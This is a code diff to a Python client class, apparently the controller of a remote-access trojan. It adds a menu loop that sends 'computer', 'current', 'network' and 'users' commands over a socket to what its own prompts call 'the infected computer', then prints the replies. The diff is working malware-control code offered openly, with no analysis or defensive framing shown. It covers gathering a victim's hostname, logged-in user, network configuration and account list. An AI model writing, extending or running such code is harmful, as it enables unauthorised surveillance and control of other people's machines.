@@ -71,6 +71,21 @@ class Client(Machine):
         choix = self.menu_principal()
         return choix
 
+    def send(self, commande):
+        distant_socket.send(commande.encode(self.language))
+
+    def receive(self):
+        rep = distant_socket.recv(self.buffsize)
+        rep = rep.decode(self.language)
+        print(rep, end="")
+
+    def quit(self):
+        print("Shutting down in 3 seconds")
+        time.sleep(3)
+        distant_socket.close()
+        self.my_socket.close()
+        sys.exit()
+
     def menu_principal(self):
         print("╔═════════════════════════════════════════════════════════╗")
         print("  |\  /|   /\   | |\  |   |\  /| |¯¯¯ |\  | |   |")
@@ -87,20 +102,23 @@ class Client(Machine):
         print("Press 2 to see who is the current user")
         print("Press 3 to get the network configuration")
         print("Press 4 to get the list of users")
-        print("Press 5 to return to main menu")
-        return input()
-
-    def send(self, commande):
-        distant_socket.send(commande.encode(self.language))
-
-    def receive(self):
-        rep = distant_socket.recv(self.buffsize)
-        rep = rep.decode(self.language)
-        print(rep, end="")
-
-    def quit(self):
-        print("Shutting down in 3 seconds")
-        time.sleep(3)
-        distant_socket.close()
-        self.my_socket.close()
-        sys.exit()
+        choix2 = input()
+        while choix2 != "5":
+            if choix2 == "1":
+                self.send("computer")
+            elif choix2 == "2":
+                self.send("current")
+            elif choix2 == "3":
+                self.send("network")
+            elif choix2 == "4":
+                self.send("users")
+            else:
+                print("Enter a valid value!")
+            list_choix_valide = ["1","2","3","4"]
+            if choix2 in list_choix_valide:
+                self.receive()
+            print("Press 1 to get the infected computer name")
+            print("Press 2 to see who is the current user")
+            print("Press 3 to get the network configuration")
+            print("Press 4 to get the list of users")
+            choix2 = input()
